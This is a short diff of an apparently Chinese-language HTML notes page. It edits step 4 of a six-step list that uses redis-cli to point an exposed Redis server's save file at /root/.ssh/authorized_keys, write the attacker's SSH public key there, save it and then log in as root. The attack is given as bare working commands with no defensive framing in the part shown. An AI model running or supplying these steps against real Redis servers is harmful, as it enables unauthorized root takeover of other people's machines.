@@ -42,7 +42,7 @@ pip install package -i  &lt;a href=&#34;https://pypi.douban.com/simple/&#34;&gt;
 1. redis-cli -h 123.123.123.123 -p 6379&lt;br /&gt;
 2. config set dbfilename authorized_keys&lt;br /&gt;
 3. config set dir &amp;ldquo;/root/.ssh&amp;rdquo;&lt;br /&gt;
-4. set aa &amp;ldquo;\n\n\$content\n\n\n&amp;rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串&lt;br /&gt;
+4. set aa &amp;ldquo;\n\n\n$content\n\n\n&amp;rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串&lt;br /&gt;
 5. save&lt;br /&gt;
 6. ssh root@123.123.123.123&lt;/p&gt;
 
